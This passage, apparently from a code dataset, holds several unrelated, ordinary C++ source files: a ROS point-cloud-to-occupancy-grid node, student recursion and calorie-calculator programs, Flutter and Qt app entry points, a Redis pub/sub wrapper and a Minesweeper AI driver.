x coordinate of the point cloud\n    float max_x_; // Maximum x coordinate of the point cloud\n    float min_y_; // Minimum y coordinate of the point cloud\n    float max_y_; // Maximum y coordinate of the point cloud\n    float grid_size_; // Grid size in meters\n    float origin_orientation_x;\n    float origin_orientation_y;\n    float origin_orientation_z;\n    float origin_orientation_w;\n    float safety_radius_;   // \uc804\uc5ed \ubcc0\uc218\ub85c safety_radius \uc124\uc815\n\n    float boat_position_x_; // \ubcf4\ud2b8\uc758 x \uc88c\ud45c\n    float boat_position_y_; // \ubcf4\ud2b8\uc758 y \uc88c\ud45c\n    float boat_radius_;     // \ubcf4\ud2b8 \uc548\uc804 \ubc18\uacbd\n    float boat_width_;     // \ubcf4\ud2b8 \uc548\uc804 \ubc18\uacbd\n    float boat_height_;     // \ubcf4\ud2b8 \uc548\uc804 \ubc18\uacbd\n\n    void declare_parameters()\n    {   \n        declare_parameter<float>(\"min_x_\", 0.0);\n        declare_parameter<float>(\"max_x_\", 10.0);\n        declare_parameter<float>(\"min_y_\", 0.0);\n        declare_parameter<float>(\"max_y_\", 10.0);\n        declare_parameter<float>(\"grid_size_\", 0.1);\n        declare_parameter<float>(\"origin_orientation_x\", 0.0);\n        declare_parameter<float>(\"origin_orientation_y\", 0.0);\n        declare_parameter<float>(\"origin_orientation_z\", 0.0);\n        declare_parameter<float>(\"origin_orientation_w\", 1.0);\n        declare_parameter<float>(\"safety_radius_\", 0.7);\n        declare_parameter<float>(\"boat_position_x_\", 0.0);\n        declare_parameter<float>(\"boat_position_y_\", 0.0);\n        declare_parameter<float>(\"boat_radius_\", 0.8);\n        declare_parameter<float>(\"boat_width_\", 0.8);\n        declare_parameter<float>(\"boat_height_\", 2.0);\n\n    }\n\n    void get_parameters()\n    {   \n        get_parameter(\"min_x_\", min_x_);\n        get_parameter(\"max_x_\", max_x_);\n        get_parameter(\"min_y_\", min_y_);\n        get_parameter(\"max_y_\", max_y_);\n        get_parameter(\"grid_size_\", grid_size_);\n\n        get_parameter(\"origin_orientation_x\", origin_orientation_x);\n        get_parameter(\"origin_orientation_y\", origin_orientation_y);\n        get_parameter(\"origin_orientation_z\", origin_orientation_z);\n        get_parameter(\"origin_orientation_w\", origin_orientation_w);\n        get_parameter(\"safety_radius_\", safety_radius_);\n        get_parameter(\"boat_position_x_\", boat_position_x_);\n        get_parameter(\"boat_position_y_\", boat_position_y_);\n        get_parameter(\"boat_radius_\", boat_radius_);\n        get_parameter(\"boat_width_\", boat_width_);\n        get_parameter(\"boat_height_\", boat_height_);\n    }\n\n    void pointcloud_callback(const sensor_msgs::msg::PointCloud2::SharedPtr msg)\n    {\n        pcl::PCLPointCloud2 pcl_cloud;\n        pcl_conversions::toPCL(*msg, pcl_cloud);\n        pcl::PointCloud<pcl::PointXYZ>::Ptr pcl_cloud_xyz(new pcl::PointCloud<pcl::PointXYZ>);\n        pcl::fromPCLPointCloud2(pcl_cloud, *pcl_cloud_xyz);\n\n        // Voxel grid downsampling (optional, for efficiency)\n        pcl::VoxelGrid<pcl::PointXYZ> vg;\n        vg.setInputCloud(pcl_cloud_xyz);\n        vg.setLeafSize(0.5, 0.5, 0.5); // Adjust the leaf size according to your preference\n        pcl::PointCloud<pcl::PointXYZ>::Ptr pcl_cloud_downsampled(new pcl::PointCloud<pcl::PointXYZ>);\n        vg.filter(*pcl_cloud_downsampled);\n    \n        // Convert PointCloud to OccupancyGrid\n        nav_msgs::msg::OccupancyGrid occupancy_grid;\n        \n        // Assuming grid parameters\n        float min_x = min_x_; // Minimum x coordinate of the point cloud\n        float max_x = max_x_; // Maximum x coordinate of the point cloud\n        float min_y = min_y_; // Minimum y coordinate of the point cloud\n        float max_y = max_y_; // Maximum y coordinate of the point cloud\n        float grid_size = grid_size_; // Grid size in meters\n        // int grid_width = static_cast<int>((max_x - min_x) / grid_size) + 1; // Number of grid cells along x-axis\n        // int grid_height = static_cast<int>((max_y - min_y) / grid_size) + 1; // Number of grid cells along y-axis\n        int grid_width = static_cast<int>((max_x - min_x) / grid_size) + 1;\n        int grid_height = st",
    "#include <iostream>\n#include <string>\n#include <cmath>\nusing namespace std;\n\nint k = 1;\n\nint sum_n(int n) {\n    if (n == 0)\n        return 0;\n    return n % 10 + sum_n(n / 10);\n}\n\nvoid tail_r_arithmetic(int* mas, int n, int a, int d, int ind) {\n    if (ind == n)\n        return;\n    mas[ind] = mas[ind - 1] + d;\n    tail_r_arithmetic(mas, n, a, d, ind + 1);\n}\n\nvoid linear_r_arithmetic(int* mas, int n, int a, int d, int k) {\n    if (k > 1) {\n        k--;\n        linear_r_arithmetic(mas, n, a, d, k);\n    }\n    mas[k] = a + (k - 1) * d;\n}\n\nvoid tail_r_geometric(int* mas, int n, int a, int r, int ind) {\n    if (ind == n)\n        return;\n    mas[ind] = mas[ind - 1] * r;\n    tail_r_geometric(mas, n, a, r, ind + 1);\n}\n\nvoid linear_r_geometric(int* mas, int n, int a, int r, int k) {\n    if (k > 1) {\n        k--;\n        linear_r_geometric(mas, n, a, r, k);\n    }\n    mas[k] = a * pow(r, k - 1);\n}\n\nvoid print(int* mas, int n) {\n    for (int i = 0; i < n; i++)\n        cout << mas[i] << \" \";\n    cout << endl;\n}\n\nint main() {\n    setlocale(LC_ALL, \"Ukr\");\n    cout << \"\u00c7\u00e0\u00e2\u00e4\u00e0\u00ed\u00ed\u00ff 1: \u00f1\u00f2\u00e2\u00ee\u00f0\u00e8\u00f2\u00e8 \u00e0\u00f0\u00e8\u00f4\u00ec\u00e5\u00f2\u00e8\u00f7\u00ed\u00f3 \u00ef\u00f0\u00ee\u00e3\u00f0\u00e5\u00f1i\u00fe \u00e7\u00e0 \u00e4\u00ee\u00ef\u00ee\u00ec\u00ee\u00e3\u00ee\u00fe \u00f0\u00e5\u00ea\u00f3\u00f0\u00f1i\u00bf\" << endl;\n    int b, n, ind = 1;\n    int mas[100];\n\n    cout << \"\u00c2\u00e2\u00e5\u00e4i\u00f2\u00fc \u00f0\u00ee\u00e7\u00eci\u00f0 \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3: \";\n    cin >> n;\n    cout << \"\u00c2\u00e2\u00e5\u00e4i\u00f2\u00fc \u00ef\u00e5\u00f0\u00f8\u00e8\u00e9 \u00f7\u00eb\u00e5\u00ed \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3 (\u00f6i\u00eb\u00e5 \u00f7\u00e8\u00f1\u00eb\u00ee): \";\n    cin >> mas[0];\n    cout << \"\u00c2\u00e2\u00e5\u00e4i\u00f2\u00fc \u00f0i\u00e7\u00ed\u00e8\u00f6\u00fe \u00e0\u00f0\u00e8\u00f4\u00ec\u00e5\u00f2\u00e8\u00f7\u00ed\u00ee\u00bf \u00ef\u00f0\u00ee\u00e3\u00f0\u00e5\u00f1i\u00bf: \";\n    cin >> b;\n    tail_r_arithmetic(mas, n, mas[0], b, ind);\n    cout << \"\u00c0\u00f0\u00e8\u00f4\u00ec\u00e5\u00f2\u00e8\u00f7\u00ed\u00e0 \u00ef\u00f0\u00ee\u00e3\u00f0\u00e5\u00f1i\u00ff \u00e7\u00e0 \u00f5\u00e2\u00ee\u00f1\u00f2\u00ee\u00e2\u00ee\u00fe \u00f0\u00e5\u00ea\u00f3\u00f0\u00f1i\u00ba\u00fe:\" << endl;\n    print(mas, n);\n\n    for (int i = 1; i < n; i++)\n        mas[i] = 0;\n    k = n;\n    linear_r_arithmetic(mas, n, mas[0], b, k);\n    cout << \"\u00c0\u00f0\u00e8\u00f4\u00ec\u00e5\u00f2\u00e8\u00f7\u00ed\u00e0 \u00ef\u00f0\u00ee\u00e3\u00f0\u00e5\u00f1i\u00ff \u00e7\u00e0 \u00ebi\u00edi\u00e9\u00ed\u00ee\u00fe \u00f0\u00e5\u00ea\u00f3\u00f0\u00f1i\u00ba\u00fe:\" << endl;\n    print(mas, n);\n\n    cout << endl;\n    cout << \"\u00c7\u00e0\u00e2\u00e4\u00e0\u00ed\u00ed\u00ff 2: \u00e7\u00ed\u00e0\u00e9\u00f2\u00e8 \u00f1\u00f3\u00ec\u00f3 \u00f6\u00e8\u00f4\u00f0 \u00e7\u00e0\u00e4\u00e0\u00ed\u00ee\u00e3\u00ee \u00ed\u00e0\u00f2\u00f3\u00f0\u00e0\u00eb\u00fc\u00ed\u00ee\u00e3\u00ee \u00f7\u00e8\u00f1\u00eb\u00e0.\" << endl;\n    int r;\n    cout << \"\u00c2\u00e2\u00e5\u00e4i\u00f2\u00fc \u00f7\u00e8\u00f1\u00eb\u00ee: \";\n    cin >> r;\n    cout << \"\u00d1\u00f3\u00ec\u00e0 \u00f6\u00e8\u00f4\u00f0 \u00f7\u00e8\u00f1\u00eb\u00e0: \" << sum_n(r) << endl;\n\n    system(\"pause\");\n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"weather_app_miniproject\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//CaloriesClient.cpp\n// Un  programa que te indique las calor\u00edas perdidas a la hora de ejercitarte en el gimnasio, \n// teniendo en cuenta el tipo de ejercicio, las repeticiones realizadas, \n// la altura, edad y peso del usuario.\n\n#include <iostream>\n#include \"CaloriesLibrary.h\"\n#include <windows.h> \n#include <CaloriesLibrary.cpp>\nusing namespace std;\n\n\n//colors\n#define BLACK   \"\\x1B[30m\"\n#define RED     \"\\x1b[31m\"\n#define GREEN   \"\\x1b[32m\"\n#define YELLOW  \"\\x1b[33m\"\n#define BLUE    \"\\x1b[34m\"\n#define MAGENTA \"\\x1b[35m\"\n#define CYAN    \"\\x1b[36m\"\n#define WHITE   \"\\x1B[37m\"\n#define ORANGE  \"\\x1B[38;2;255;128;0m\"\n#define ROSE    \"\\x1B[38;2;255;151;203m\"\n#define LBLUE   \"\\x1B[38;2;53;149;240m\"\n#define LGREEN  \"\\x1B[38;2;17;245;120m\"\n#define GRAY    \"\\x1B[38;2;176;174;174m\"\n#define RESET   \"\\x1b[0m\"\n\n\n\n    \n\n//Variables\nint proporcionarDatos;\nint opcion;\nint cantidadejercicios;\nint ejercicio;\nint repeticiones;\nint edad;\nint peso;\nint altura;\nstring sexo;\nint MB;\nint estilo_vida;\nfloat factorActividad;\nfloat calorias_quemadas_sin_ejercicio;\nint calorias_totales;\n\n\nint main()\n{\n    CaloriesLibrary::initEjercicios();\n    \n    system(\"CLS\");\n    cout << LGREEN << \"----CALCULADORA DE CALORIAS----\" << RESET << \"\\n\\n\\n\";\n    Sleep(2000);\n    cout  << \"Para empezar necesitamos ciertos datos personales para calcular correctamente las calorias perdidas:\\n-Altura\\n-Edad\\n-Peso \\n\\n\";\n    Sleep(2000);\n    cout << \"Acepta proporcionarnos los datos anteriormente mencionados?\\n1. Si\\n2. No\\n\";\n    cin >> proporcionarDatos;\n    system(\"CLS\");\n    cout << LGREEN << \"----CALCULADORA DE CALORIAS----\" << RESET << \"\\n\\n\\n\";\n    if (proporcionarDatos == 1) {\n        do {\n            cout << \"Que quiere hacer?\\n\";\n            cout << \"1. Ver listado ejercicios - calorias\\n\";\n            cout << \"2. Acceder a la calculadora de calorias\\n\";\n            cout << \"3. Salir\\n\";\n            cin >> opcion;\n            system(\"CLS\");\n            cout << LGREEN << \"----CALCULADORA DE CALORIAS----\" << RESET << \"\\n\\n\\n\";\n\n            switch (opcion) {\n            case 1:\n                cout << \"Listado de ejercicios:\\n\";\n                CaloriesLibrary::listaEjercicios();\n                Sleep(2000);\n                cout << \"Que quiere hacer?\\n\";\n                cout << \"1. Volver al menu\\n\";\n                cout << \"2. Salir\\n\";\n                cin >> opcion;\n                system(\"CLS\");\n                cout << LGREEN << \"----CALCULADORA DE CALORIAS----\" << RESET << \"\\n\\n\\n\";\n                if (opcion == 2) {\n                    opcion = 0;\n                }\n                break;\n\n            case 2:\n               \n                cout << \"Eres hombre o mujer?(H/M)\\n\";\n                cin >> sexo;\n\n                \n\n                cout << \"Cuantos anos tienes?\\n\";\n                cin >> edad;\n                cout << \"Cuantos pesas?\\n\";\n                cin >> peso;\n                cout << \"Cuanto mides (cm)?\\n\";\n                cin >> altura;\n\n                if (sexo == \"H\" || sexo == \"h\") {\n                    MB = 88.362 + (13.397 * peso) + (4.799 * altura) - (5.677 * edad);\n                }\n                else if (sexo == \"M\" || sexo == \"m\") {\n                    MB = 447.593 + (9.247 * peso) + (3.098 * altura) - (4.330 * edad);\n                }\n                else {\n                    cout << \"Opcion no valida.\\n\\n\\n\\n\";\n                    return 1;\n                }\n\n                cout << \"Selecciona estilo de vida:\\n\";\n                cout << \"1. Sedentario\\n\";\n                cout << \"2. Levemente activo\\n\";\n                cout << \"3. Moderadamente activo\\n\";\n                cout << \"4. Muy activo\\n\";\n                cout << \"5. Extremadamente activo\\n\";\n                cin >> estilo_vida;\n\n                switch (estilo_vida) {\n                case 1:\n                    factorActividad = 1.2;\n                    break;\n                case 2:\n                    factorActividad = 1.375;\n                    break;\n                case 3:\n                    factorActividad = 1.55;\n                    break;\n                case 4:\n                    factorActividad = 1.725;\n                    break;\n                case 5:\n                    factorActividad = 1.9;\n                    break;\n                default:\n                    cout << \"Opci\u00f3n no valida.\";\n                    factorActividad = 1.2;\n                }\n\n                calorias_quemadas_sin_ejercicio = MB * factorActividad;\n\n                CaloriesLibrary::listaEjercicios();\n                cout << \"Cuantos ejercicios diferentes has realizado?\\n\";\n                cin >> cantidadejercicios;\n\n                calorias_totales = calorias_quemadas_sin_ejercicio;\n\n                for (size_t i = 0; i <= cantidadejercicios - 1; i++)\n                {\n                    CaloriesLibrary::listaEjercicios();\n                    cout << \"Seleccione el ejercicio \" << i + 1 << \"\\n\";\n                    cin >> ejercicio;\n                    CaloriesLibrary::ej",
    "\ufeff#include <QGuiApplication>\n#include <QQmlApplicationEngine>\n#include <QQmlContext>\n#include \"../RemoteServer/hosttest.h\"\n#include \"modemanager.h\"\n\nint main(int argc, char *argv[])\n{\n#if QT_VERSION < QT_VERSION_CHECK(6, 0, 0)\n    QCoreApplication::setAttribute(Qt::AA_EnableHighDpiScaling);\n#endif\n\n    // QLoggingCategory::setFilterRules(\"qt.remoteobjects.debug=true\\n\"\n    //                                  \"qt.remoteobjects.warning=true\\n\"\n    //                                  \"qt.remoteobjects.info=true\\n\"\n    //                                  \"qt.remoteobjects.models.debug=true\\n\"\n    //                                  \"qt.remoteobjects.models.warning=true\\n\"\n    //                                  \"qt.remoteobjects.models.info=true\\n\"\n    //                                  \"qt.remoteobjects.io.debug=true\\n\"\n    //                                  \"qt.remoteobjects.io.warning=true\\n\"\n    //                                  \"qt.remoteobjects.io.info=true\\n\");\n    // QLoggingCategory::setFilterRules(\"qt.remoteobjects.*=true\\n\"\n    //                                  \"qt.remoteobjects.models.*=true\\n\"\n    //                                  \"qt.remoteobjects.io.*=true\\n\");\n\n    QGuiApplication app(argc, argv);\n\n    static ModeManager tugs(QUrl(\"local:tugs\"), QStringLiteral(\"TiQmlObjectListModel\"));\n\n    QQmlApplicationEngine engine;\n\n    qmlRegisterUncreatableType<ModeManager>(\"ModeManager\", 1, 0, \"ModeManager\", \"\");\n    qmlRegisterType<Data>(\"Data\", 1, 0, \"Data\");\n    qmlRegisterType<Actor>(\"Actor\", 1, 0, \"Actor\");\n\n    engine.rootContext()->setContextProperty(\"$tugs\", &tugs);\n\n    const QUrl url(QStringLiteral(\"qrc:/main.qml\"));\n    QObject::connect(\n        &engine,\n        &QQmlApplicationEngine::objectCreated,\n        &app,\n        [url](QObject *obj, const QUrl &objUrl) {\n            if (!obj && url == objUrl)\n                QCoreApplication::exit(-1);\n        },\n        Qt::QueuedConnection);\n    engine.load(url);\n\n    return app.exec();\n}\n",
    "#include \"redis.hpp\"\n#include <iostream>\nusing namespace std;\n\nRedis::Redis()\n    : _publish_context(nullptr), _subcribe_context(nullptr)\n{\n}\n\nRedis::~Redis()\n{\n    if (_publish_context != nullptr)\n    {\n        redisFree(_publish_context);\n    }\n\n    if (_subcribe_context != nullptr)\n    {\n        redisFree(_subcribe_context);\n    }\n}\n\nbool Redis::connect()\n{\n    // \u8d1f\u8d23publish\u53d1\u5e03\u6d88\u606f\u7684\u4e0a\u4e0b\u6587\u8fde\u63a5\n    _publish_context = redisConnect(\"127.0.0.1\", 6379);\n    if (nullptr == _publish_context)\n    {\n        cerr << \"connect redis failed!\" << endl;\n        return false;\n    }\n\n    // \u8d1f\u8d23subscribe\u8ba2\u9605\u6d88\u606f\u7684\u4e0a\u4e0b\u6587\u8fde\u63a5\n    _subcribe_context = redisConnect(\"127.0.0.1\", 6379);\n    if (nullptr == _subcribe_context)\n    {\n        cerr << \"connect redis failed!\" << endl;\n        return false;\n    }\n\n    // \u5728\u5355\u72ec\u7684\u7ebf\u7a0b\u4e2d\uff0c\u76d1\u542c\u901a\u9053\u4e0a\u7684\u4e8b\u4ef6\uff0c\u6709\u6d88\u606f\u7ed9\u4e1a\u52a1\u5c42\u8fdb\u884c\u4e0a\u62a5\n    thread t([&]() {\n        observer_channel_message();\n    });\n    t.detach();\n\n    cout << \"connect redis-server success!\" << endl;\n\n    return true;\n}\n\n// \u5411redis\u6307\u5b9a\u7684\u901a\u9053channel\u53d1\u5e03\u6d88\u606f\nbool Redis::publish(int channel, string message)\n{\n    redisReply *reply = (redisReply *)redisCommand(_publish_context, \"PUBLISH %d %s\", channel, message.c_str());\n    if (nullptr == reply)\n    {\n        cerr << \"publish command failed!\" << endl;\n        return false;\n    }\n    freeReplyObject(reply);\n    return true;\n}\n\n// \u5411redis\u6307\u5b9a\u7684\u901a\u9053subscribe\u8ba2\u9605\u6d88\u606f\nbool Redis::subscribe(int channel)\n{\n    // SUBSCRIBE\u547d\u4ee4\u672c\u8eab\u4f1a\u9020\u6210\u7ebf\u7a0b\u963b\u585e\u7b49\u5f85\u901a\u9053\u91cc\u9762\u53d1\u751f\u6d88\u606f\uff0c\u8fd9\u91cc\u53ea\u505a\u8ba2\u9605\u901a\u9053\uff0c\u4e0d\u63a5\u6536\u901a\u9053\u6d88\u606f\n    // \u901a\u9053\u6d88\u606f\u7684\u63a5\u6536\u4e13\u95e8\u5728observer_channel_message\u51fd\u6570\u4e2d\u7684\u72ec\u7acb\u7ebf\u7a0b\u4e2d\u8fdb\u884c\n    // \u53ea\u8d1f\u8d23\u53d1\u9001\u547d\u4ee4\uff0c\u4e0d\u963b\u585e\u63a5\u6536redis server\u54cd\u5e94\u6d88\u606f\uff0c\u5426\u5219\u548cnotifyMsg\u7ebf\u7a0b\u62a2\u5360\u54cd\u5e94\u8d44\u6e90\n    if (REDIS_ERR == redisAppendCommand(this->_subcribe_context, \"SUBSCRIBE %d\", channel))\n    {\n        cerr << \"subscribe command failed!\" << endl;\n        return false;\n    }\n    // redisBufferWrite\u53ef\u4ee5\u5faa\u73af\u53d1\u9001\u7f13\u51b2\u533a\uff0c\u76f4\u5230\u7f13\u51b2\u533a\u6570\u636e\u53d1\u9001\u5b8c\u6bd5\uff08done\u88ab\u7f6e\u4e3a1\uff09\n    int done = 0;\n    while (!done)\n    {\n        if (REDIS_ERR == redisBufferWrite(this->_subcribe_context, &done))\n        {\n            cerr << \"subscribe command failed!\" << endl;\n            return false;\n        }\n    }\n    // redisGetReply\n\n    return true;\n}\n\n// \u5411redis\u6307\u5b9a\u7684\u901a\u9053unsubscribe\u53d6\u6d88\u8ba2\u9605\u6d88\u606f\nbool Redis::unsubscribe(int channel)\n{\n    if (REDIS_ERR == redisAppendCommand(this->_subcribe_context, \"UNSUBSCRIBE %d\", channel))\n    {\n        cerr << \"unsubscribe command failed!\" << endl;\n        return false;\n    }\n    // redisBufferWrite\u53ef\u4ee5\u5faa\u73af\u53d1\u9001\u7f13\u51b2\u533a\uff0c\u76f4\u5230\u7f13\u51b2\u533a\u6570\u636e\u53d1\u9001\u5b8c\u6bd5\uff08done\u88ab\u7f6e\u4e3a1\uff09\n    int done = 0;\n    while (!done)\n    {\n        if (REDIS_ERR == redisBufferWrite(this->_subcribe_context, &done))\n        {\n            cerr << \"unsubscribe command failed!\" << endl;\n            return false;\n        }\n    }\n    return true;\n}\n\n// \u5728\u72ec\u7acb\u7ebf\u7a0b\u4e2d\u63a5\u6536\u8ba2\u9605\u901a\u9053\u4e2d\u7684\u6d88\u606f\nvoid Redis::observer_channel_message()\n{\n    redisReply *reply = nullptr;\n    while (REDIS_OK == redisGetReply(this->_subcribe_context, (void **)&reply))\n    {\n        // \u8ba2\u9605\u6536\u5230\u7684\u6d88\u606f\u662f\u4e00\u4e2a\u5e26\u4e09\u5143\u7d20\u7684\u6570\u7ec4\n        if (reply != nullptr && reply->element[2] != nullptr && reply->element[2]->str != nullptr)\n        {\n            // \u7ed9\u4e1a\u52a1\u5c42\u4e0a\u62a5\u901a\u9053\u4e0a\u53d1\u751f\u7684\u6d88\u606f\n            _notify_message_handler(atoi(reply->element[1]->str) , reply->element[2]->str);\n        }\n\n        freeReplyObject(reply);\n    }\n\n    cerr << \">>>>>>>>>>>>> observer_channel_message quit <<<<<<<<<<<<<\" << endl;\n}\n\nvoid Redis::init_notify_handler(function<void(int,string)> fn)\n{\n    this->_notify_message_handler = fn;\n}",
    "// ======================================================================\n// FILE:        Main.cpp\n//\n// AUTHOR:      Jian Li\n//\n// DESCRIPTION: This file is the entry point for the program. The main\n//              function serves a couple purposes: (1) It is the\n//              interface with the command line. (2) It reads the files,\n//              creates the World object, and passes that all the\n//              information necessary. (3) It is in charge of outputing\n//              information.\n//\n// NOTES:       - Syntax:\n//\n//                \tMinesweeper [Options] [InputFile] [OutputFile]\n//\n//                  Options:\n//\t\t\t\t\t\t-m Use the ManualAI instead of MyAI.\n//\t\t\t\t\t\t-r Use the RandomAI instead of MyAI.\n//                      -d Debug mode, which displays the game board\n//                         after every mode. Useless with -m.\n//                      -v Verbose mode displays world file names before\n//                         loading them.\n//                      -f Depending on the InputFile format supplied,\n//                         this operand will trigger program\n//                         1) Treats the InputFile as a folder containing many worlds.\n//                         The program will then construct a world for every valid world file found.\n//                         The program to display total score instead of a single score.\n//                         The InputFile operand must be specified with this option\n//                         2) Threats the inputFile as a file.\n//                         The program will then construct a world for a single valid world file found.\n//                         The program to display a single score.\n//\n//                  InputFile: A path to a valid Minesweeper File, or\n//                             folder with -f.\n//\n//                  OutputFile: A path to a file where the results will\n//                              be written. This is optional.\n//\n//              - If -m and -r are turned on, -m will be turned off.\n//\n//              - Don't make changes to this file.\n// ======================================================================\n\n#include <iostream>\n#include <dirent.h>\n#include <cmath>\n#include \"World.hpp\"\n#include <sys/stat.h>\n\n\nusing namespace std;\n\nint main( int argc, char *argv[] )\n{\n\n    // Set random seed\n    srand( time ( NULL ) );\n\n    if ( argc == 1 ){\n        World world(false, std::string(), std::string());\n        int score = world.run();\n        if (score)\n            cout << \"WORLD COMPLETE\" << endl;\n        else\n            cout <<  \"WORLD INCOMPLETE\" << endl;\n        return 0;\n    }\n\n    // Important Variables\n    bool \tdebug        = false;\n    bool\tverbose      = false;\n    string  aiType       = \"MyAI\";\n    bool \tfolder       = false;\n    string\tworldFile    = \"\";\n    string\toutputFile   = \"\";\n    string \tfirstToken \t = argv[1];\n\n    // read options if there are options\n    if ( firstToken[0] == '-' )\n    {\n        // Parse Options\n        for (int index = 1; index < firstToken.size(); ++index)\n        {\n            // If both AI's on, turn one off and let the user know.\n            if ( firstToken[index] == '-' )\n                    continue;\n            if ( firstToken[index] == 'f' || firstToken[index] =='F' )\n            {\n                struct stat path_stat;\n                worldFile = argv[2];\n                stat ( worldFile.c_str(), &path_stat );\n                folder = S_ISDIR ( path_stat.st_mode );\n            }\n\n            if ( firstToken[index] == 'v' || firstToken[index] =='V' )\n                verbose = true;\n            if ( firstToken[index] == 'r' || firstToken[index] == 'R' )\n            {\n                if ( aiType == \"manualAI\" )\n                    cout << \"[WARNING] Manual AI and Random AI both on;\"\" Manual AI was turned off.\" << endl;\n                aiType = \"randomAI\";\n            }\n            if ( firstToken[index] == 'm' || firstToken[index] == 'M' )\n            {\n                if ( aiType == \"randomAI\" )\n                    cout << \"[WARNING] Manual AI and Random AI both on; Manual AI was turned off.\" << endl;\n                else\n                    aiType = \"manualAI\";\n            }\n            if (firstToken[index] == 'd' || firstToken[index] == 'D')\n                debug = true;\n\n        }\n\n\n        if ( argc >= 4 )\n            outputFile = argv[3];\n\n    }\n\n    // no input folder for -f option turning on\n    if ( worldFile == \"\" )\n    {\n        if ( folder )\n            cout << \"[WARNING] No folder specified; running on a random world.\" << endl;\n        World world(debug, aiType, std::string());\n        int score = world.run();\n        if (score)\n            cout << \"WORLD COMPLETE\" << endl;\n        else\n            cout <<  \"WORLD INCOMPLETE\" << endl;\n        return 0;\n    }\n\n\n\n    // no input file or invalid file for -f option turning on\n    if ( folder )\n    {\n        DIR *dir;\n        if ((dir = opendir(worldFile.c_str())) == NULL)\n        {\n            cout ",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"suraj_expense_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
